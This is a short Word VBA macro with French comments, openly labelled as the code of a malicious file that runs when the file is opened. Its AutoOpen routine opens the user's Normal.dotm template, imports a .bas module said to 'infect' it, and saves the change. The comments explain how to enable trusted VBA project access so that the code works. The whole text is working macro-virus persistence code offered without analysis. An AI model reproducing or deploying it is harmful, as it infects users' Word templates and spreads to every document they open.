Macro du fichier malveillant, s'exécute à l'ouverture
Pour que le code fonctionne : onglet Développeur sur Word -> sécurité des macros -> cocher accès approuvé au modèle d'objet VBA

Sub AutoOpen()
    'Sur VBA : Outils -> Références -> Cocher Microsoft Visual Basic for Applications Extensibility
    
	Application.CommandBars.ExecuteMso ("MacroSecurity")
	
    Dim VBProj As VBIDE.VBProject
    Dim oDoc As Document
    
    Set oDoc = Documents.Open(Application.NormalTemplate.Path & "\Normal.dotm")
    
    Set VBProj = oDoc.VBProject
    
    'Il faut mettre le path du .bas qui va infecter le Normal.dotm
    VBProj.VBComponents.Import ("path")
    
    oDoc.Close wdSaveChanges
    
End Sub


